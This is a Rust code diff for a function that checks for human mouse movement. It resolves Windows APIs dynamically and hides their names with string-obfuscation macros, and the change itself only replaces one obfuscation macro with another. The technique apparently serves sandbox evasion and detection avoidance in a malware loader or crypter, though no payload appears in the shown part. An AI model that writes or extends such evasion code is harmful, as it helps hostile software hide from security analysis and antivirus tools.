@@ -1,6 +1,6 @@
 #[allow(dead_code)]
+use obfstr::obfbytes;
 pub fn has_human_mouse_movement() -> bool {
-    use rustcrypt_ct_macros::obf_lit_bytes;
     use std::mem::{size_of, transmute};
     use windows_sys::Win32::Foundation::POINT;
     use crate::utils::{load_library, get_proc_address};
@@ -23,32 +23,32 @@ pub fn has_human_mouse_movement() -> bool {
 
     unsafe {
         // 解析需要的 API
-        let user32 = match load_library(&obf_lit_bytes!(b"user32.dll\0")) {
+        let user32 = match load_library(&obfbytes!(b"user32.dll\0")) {
             Ok(h) => h,
             Err(_) => return false,
         };
-        let kernel32 = match load_library(&obf_lit_bytes!(b"kernel32.dll\0")) {
+        let kernel32 = match load_library(&obfbytes!(b"kernel32.dll\0")) {
             Ok(h) => h,
             Err(_) => return false,
         };
 
-        let p_get_cursor_pos = match get_proc_address(user32, &obf_lit_bytes!(b"GetCursorPos\0")) {
+        let p_get_cursor_pos = match get_proc_address(user32, &obfbytes!(b"GetCursorPos\0")) {
             Ok(f) => f,
             Err(_) => return false,
         };
         let get_cursor_pos: unsafe extern "system" fn(*mut POINT) -> i32 = transmute(p_get_cursor_pos);
 
-        let p_get_last_input = get_proc_address(user32, &obf_lit_bytes!(b"GetLastInputInfo\0")).ok();
+        let p_get_last_input = get_proc_address(user32, &obfbytes!(b"GetLastInputInfo\0")).ok();
         let get_last_input: Option<unsafe extern "system" fn(*mut LastInputInfo) -> i32> =
             p_get_last_input.map(|f| transmute(f));
 
-        let p_sleep = match get_proc_address(kernel32, &obf_lit_bytes!(b"Sleep\0")) {
+        let p_sleep = match get_proc_address(kernel32, &obfbytes!(b"Sleep\0")) {
             Ok(f) => f,
             Err(_) => return false,
         };
         let sleep: unsafe extern "system" fn(u32) = transmute(p_sleep);
 
-        let p_tick = get_proc_address(kernel32, &obf_lit_bytes!(b"GetTickCount\0")).ok();
+        let p_tick = get_proc_address(kernel32, &obfbytes!(b"GetTickCount\0")).ok();
         let get_tick: Option<unsafe extern "system" fn() -> u32> = p_tick.map(|f| transmute(f));
 
         // 采样参数
